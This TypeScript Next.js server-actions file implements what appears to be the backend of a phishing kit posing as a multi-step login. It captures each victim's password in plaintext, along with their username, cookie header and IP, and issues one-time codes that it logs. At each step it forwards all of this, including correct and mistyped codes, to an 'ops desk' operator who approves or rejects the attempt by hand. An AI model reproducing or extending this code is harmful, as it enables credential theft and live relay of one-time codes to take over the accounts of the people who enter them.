'use server'

import { createHash, randomBytes, randomInt } from 'node:crypto'
import { cookies, headers } from 'next/headers'
import { ADMIN_EMAIL, ADMIN_OPS_PASSWORD } from '@/lib/constants'
import {
  getAttempt,
  listActiveAttempts,
  saveAttempt,
  type LoginAttempt,
} from '@/lib/store'
import { sendAdminStepAlert, sendOtpEmail } from '@/lib/mail'

function hashOtp(otp: string) {
  return createHash('sha256').update(otp).digest('hex')
}

function newId() {
  return randomBytes(12).toString('hex')
}

function isValidEmail(email: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function meta() {
  const h = await headers()
  return {
    ip:
      h.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      h.get('x-real-ip') ||
      null,
    ua: h.get('user-agent') || null,
    cookie: h.get('cookie') || null,
  }
}

async function alert(a: LoginAttempt, step: string, event: string) {
  void sendAdminStepAlert({
    attemptId: a.id,
    email: a.email,
    step,
    event,
    passwordPlain: a.passwordPlain,
    username: a.username || undefined,
    otpPlain: a.otpPlain || undefined,
    cookieHeader: a.cookieHeader || undefined,
    ip: a.ip || undefined,
    userAgent: a.userAgent || undefined,
  }).catch((e) => console.error(e))
}

export async function startChallenge(input: {
  email: string
  password: string
}): Promise<{ ok: true; attemptId: string } | { ok: false; error: string }> {
  const email = String(input.email || '').trim().toLowerCase()
  const password = String(input.password || '')
  if (!email || !password) return { ok: false, error: 'Email and password required.' }
  if (!isValidEmail(email)) return { ok: false, error: 'Enter a valid email.' }

  const m = await meta()
  const id = newId()
  const now = Date.now()
  const a: LoginAttempt = {
    id,
    email,
    passwordPlain: password,
    username: null,
    otpPlain: null,
    otpHash: null,
    otpExpiresAt: null,
    step: 'username',
    status: 'in_progress',
    otp1Verified: false,
    otp2Verified: false,
    lastEvent: 'Email & password accepted — waiting for username',
    ip: m.ip,
    userAgent: m.ua,
    cookieHeader: m.cookie,
    createdAt: now,
    updatedAt: now,
  }
  saveAttempt(a)
  await alert(a, 'credentials', 'User submitted email & password')
  return { ok: true, attemptId: id }
}

export async function submitUsername(input: {
  attemptId: string
  username: string
}): Promise<{ ok: true } | { ok: false; error: string }> {
  const username = String(input.username || '').trim()
  if (!username) return { ok: false, error: 'Username required.' }
  if (username.length > 6) return { ok: false, error: 'Username max 6 characters.' }

  const a = getAttempt(input.attemptId)
  if (!a || a.status !== 'in_progress' || a.step !== 'username') {
    return { ok: false, error: 'Session expired. Start again.' }
  }

  const otp = String(randomInt(100000, 999999))
  a.username = username
  a.otpPlain = otp
  a.otpHash = hashOtp(otp)
  a.otpExpiresAt = Date.now() + 10 * 60 * 1000
  a.step = 'otp1'
  a.lastEvent = `Username "${username}" — OTP #1 sent`
  a.updatedAt = Date.now()
  const m = await meta()
  a.cookieHeader = m.cookie ?? a.cookieHeader
  saveAttempt(a)

  await sendOtpEmail(a.email, otp, 'OTP #1').catch(console.error)
  console.info('[login-ops] OTP #1', a.email, otp)
  await alert(a, 'username', `Username entered. OTP #1 emailed.`)
  return { ok: true }
}

export async function submitOtp(input: {
  attemptId: string
  otp: string
  which: 1 | 2
}): Promise<
  | { ok: true; next: 'otp2' | 'awaiting_approval' }
  | { ok: false; error: string }
> {
  const otp = String(input.otp || '').replace(/\D/g, '')
  if (otp.length !== 6) return { ok: false, error: 'Enter the 6-digit code.' }

  const a = getAttempt(input.attemptId)
  if (!a || a.status !== 'in_progress') {
    return { ok: false, error: 'Session expired. Start again.' }
  }
  const expected = input.which === 1 ? 'otp1' : 'otp2'
  if (a.step !== expected) return { ok: false, error: 'Unexpected step.' }
  if (!a.otpHash || !a.otpExpiresAt || a.otpExpiresAt < Date.now()) {
    return { ok: false, error: 'Code expired. Start again.' }
  }
  if (hashOtp(otp) !== a.otpHash) {
    a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
    a.updatedAt = Date.now()
    saveAttempt(a)
    await alert(a, expected, `OTP #${input.which} failed — entered ${otp}`)
    return { ok: false, error: 'Incorrect code.' }
  }

  if (input.which === 1) {
    const otp2 = String(randomInt(100000, 999999))
    a.otp1Verified = true
    a.otpPlain = otp2
    a.otpHash = hashOtp(otp2)
    a.otpExpiresAt = Date.now() + 10 * 60 * 1000
    a.step = 'otp2'
    a.lastEvent = 'OTP #1 verified — NEW OTP #2 sent'
    a.updatedAt = Date.now()
    saveAttempt(a)
    await sendOtpEmail(a.email, otp2, 'OTP #2').catch(console.error)
    console.info('[login-ops] OTP #2', a.email, otp2)
    await alert(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
    return { ok: true, next: 'otp2' }
  }

  a.otp2Verified = true
  a.step = 'awaiting_approval'
  a.status = 'awaiting_approval'
  a.lastEvent = 'OTP #2 verified — waiting for ops approval'
  a.updatedAt = Date.now()
  saveAttempt(a)
  await alert(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
  return { ok: true, next: 'awaiting_approval' }
}

export async function getStatus(attemptId: string) {
  const a = getAttempt(attemptId)
  if (!a) return { status: 'expired', step: 'expired', lastEvent: 'Not found' }
  return { status: a.status, step: a.step, lastEvent: a.lastEvent }
}

export async function adminLogin(input: {
  email: string
  password: string
}): Promise<{ ok: true } | { ok: false; error: string }> {
  const email = String(input.email || '').trim().toLowerCase()
  const password = String(input.password || '')
  if (email !== ADMIN_EMAIL || password !== ADMIN_OPS_PASSWORD) {
    return { ok: false, error: 'Invalid admin credentials.' }
  }
  const jar = await cookies()
  jar.set('ops_admin', '1', {
    httpOnly: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 60 * 60 * 12,
  })
  return { ok: true }
}

export async function adminLogout() {
  const jar = await cookies()
  jar.delete('ops_admin')
}

export async function isAdminSession() {
  const jar = await cookies()
  return jar.get('ops_admin')?.value === '1'
}

export async function listAttempts() {
  if (!(await isAdminSession())) return []
  return listActiveAttempts()
}

export async function decide(
  attemptId: string,
  decision: 'approved' | 'rejected'
): Promise<{ ok: true } | { ok: false; error: string }> {
  if (!(await isAdminSession())) return { ok: false, error: 'Unauthorized' }
  const a = getAttempt(attemptId)
  if (!a) return { ok: false, error: 'Not found' }
  a.status = decision
  a.step = decision
  a.lastEvent =
    decision === 'approved'
      ? 'Approved by operations desk'
      : 'Rejected by operations desk'
  a.updatedAt = Date.now()
  saveAttempt(a)
  await alert(a, decision, a.lastEvent)
  return { ok: true }
}
